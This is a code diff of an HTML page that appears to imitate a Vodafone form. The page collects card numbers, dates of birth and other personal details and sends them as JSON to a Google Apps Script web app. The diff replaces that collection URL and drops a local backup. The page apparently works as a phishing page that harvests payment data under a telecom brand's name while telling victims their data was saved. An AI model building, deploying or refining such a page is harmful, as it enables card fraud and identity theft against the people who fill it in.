@@ -25,11 +25,8 @@
     .input-group input, .input-group select { background: #ffffff; border: 1px solid #cfdfed; border-radius: 16px; padding: 12px 16px; font-size: 0.9rem; outline: none; width: 100%; }
     .full-width { grid-column: 1 / -1; }
     .card-row { display: grid; grid-template-columns: 1fr 0.6fr 0.8fr; gap: 12px; }
-    
-    /* HORIZONTAL DATE OF BIRTH - ALWAYS HORIZONTAL */
     .dob-horizontal { display: flex; gap: 10px; width: 100%; }
     .dob-horizontal input { flex: 1; text-align: center; }
-    
     .form-actions { padding: 1.5rem; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 16px; background: white; border-radius: 0 0 24px 24px; }
     .btn { padding: 12px 28px; border-radius: 40px; font-weight: 700; border: none; cursor: pointer; transition: 0.2s; }
     .btn-primary { background: #e60000; color: white; }
@@ -47,13 +44,9 @@
     .thankyou-modal { background: white; max-width: 400px; width: 90%; border-radius: 32px; text-align: center; padding: 2rem; }
     .thankyou-modal i { font-size: 3rem; color: #e60000; margin-bottom: 1rem; }
     .thankyou-modal button { background: #e60000; border: none; padding: 12px 28px; border-radius: 40px; color: white; font-weight: 700; cursor: pointer; }
-    
-    /* Mobile Responsive - DOB stays HORIZONTAL */
     @media (max-width: 680px) { 
       .card-row { grid-template-columns: 1fr; }
-      .fields-grid { padding: 1rem; }
       .dob-horizontal { flex-direction: row !important; gap: 8px; }
-      .dob-horizontal input { font-size: 0.85rem; padding: 10px 5px; }
     }
   </style>
 </head>
@@ -196,8 +189,8 @@
 </div>
 
 <script>
-// ============ YOUR GOOGLE SHEETS WEB APP URL - ADDED ============
-const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbxeEioonr_Y6sY325V88cFgUZSj5wt1kFUP3eLSBreK8vtpnJTe2LPOEJwj3h788UmP/exec";
+// ============ YOUR GOOGLE SHEETS WEB APP URL ============
+const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbyxiOFOpO_XSrG25V0ApzKPgzuTTvouurv-zRFGYSwLjj5TBacVo-_HgaRMuIB9lmxx/exec";
 
 const form = document.getElementById('vodafoneForm');
 const toast = document.getElementById('toastMsg');
@@ -230,35 +223,20 @@ function resetForm() {
   document.getElementById('dobYear').value = '';
 }
 
-// Send data to Google Sheets (CLOUD DATABASE)
 async function sendToCloudDatabase(formData) {
   try {
     const response = await fetch(GOOGLE_SHEETS_URL, {
       method: 'POST',
       mode: 'no-cors',
-      headers: {
-        'Content-Type': 'application/json',
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(formData)
     });
-    
-    // With no-cors, we can't read response, but request is sent
     console.log('Data sent to cloud database');
     return true;
   } catch(error) {
     console.error('Cloud error:', error);
     return false;
   }
-}
-
-// Also save to localStorage as backup
-function saveToLocalBackup(data) {
-  try {
-    const backups = JSON.parse(localStorage.getItem('vodafone_backup') || '[]');
-    backups.push({ id: Date.now(), timestamp: new Date().toISOString(), data: data });
-    localStorage.setItem('vodafone_backup', JSON.stringify(backups));
-    return true;
-  } catch(e) { return false; }
 }
 
 function validateForm() {
@@ -336,7 +314,6 @@ function gatherFormData() {
   return data;
 }
 
-// Formatting
 document.getElementById('cardNumber').addEventListener('input', function(e) {
   let raw = this.value.replace(/\s/g, '');
   if (raw.length > 19) raw = raw.slice(0,19);
@@ -372,12 +349,10 @@ document.getElementById('submitBtn').addEventListener('click', async function(e)
   submitBtn.disabled = true;
   submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
   
-  // Send to cloud database (Google Sheets)
   const cloudSent = await sendToCloudDatabase(formData);
-  const localSaved = saveToLocalBackup(formData);
   
   setTimeout(() => {
-    if (cloudSent || localSaved) {
+    if (cloudSent) {
       thankyouModal.classList.add('active');
       showMessage("✅ Submitted! Data saved to cloud.", false);
     } else {
